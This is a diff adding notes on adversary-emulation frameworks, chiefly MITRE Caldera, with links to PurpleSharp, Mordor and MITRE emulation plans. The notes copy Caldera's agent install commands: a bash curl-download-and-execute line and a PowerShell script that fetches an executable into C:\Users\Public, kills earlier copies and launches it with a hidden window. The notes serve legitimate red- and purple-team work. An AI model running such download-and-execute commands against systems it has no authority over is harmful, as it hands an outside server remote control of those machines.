@@ -7,6 +7,52 @@ Attack frameworks
 https://github.com/mitre/caldera
 https://caldera.readthedocs.io/en/latest/CALDERA-2.0.html
 
+Caldera is written in Python. Uses a web UI. It can be extended:
+
+* By using the existing REST API and scripting
+* Writing Python plugins
+* Adding abilities (which are attacks and similar tools to be run on the target) by yaml
+
+The agent must be installed on the target prior to instrumenting it.  There are several agents
+(using different programming languages and communication channels).
+
+The target systems downloads a agent fromt he caldera server and executes it. If the agent is in a compiled
+language it can be compiled on the server for some polymorphism.
+
+The Web UI has a help section how to install the clients. Just to give you some estimation how simple it is, here some scripts.
+
+Installing on Linux:
+
+{lang="bash"}
+    server="http://{ip}:8888";
+    curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
+    chmod +x sandcat.go;
+    ./sandcat.go -server $server -group {group_name} -v -paw {paw_name}
+
+Variables are in {}. Those are:
+
+* IP: Server ip
+* group_name: Name of the group the target should be sorted into. To target several clients with one attack
+* paw_name: Specific name for this client
+
+Installing on Windows:
+
+{lang="powershell"}
+    $server="http://{ip]}:8888";
+    $url="$server/file/download";
+    $wc=New-Object System.Net.WebClient;
+    $wc.Headers.add("platform","windows");
+    $wc.Headers.add("file","sandcat.go");
+    $data=$wc.DownloadData($url);
+    $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+    get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
+    rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
+    Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+
+
+
+
 ## MITRE plans
 
 https://www.zdnet.com/article/mitre-releases-emulation-plan-for-fin6-hacking-group-more-to-follow/
@@ -15,3 +61,7 @@ https://github.com/center-for-threat-informed-defense/adversary_emulation_librar
 ## PurpleSharp
 
 https://github.com/mvelazc0/PurpleSharp
+
+## Mordor
+
+https://github.com/OTRF/mordor
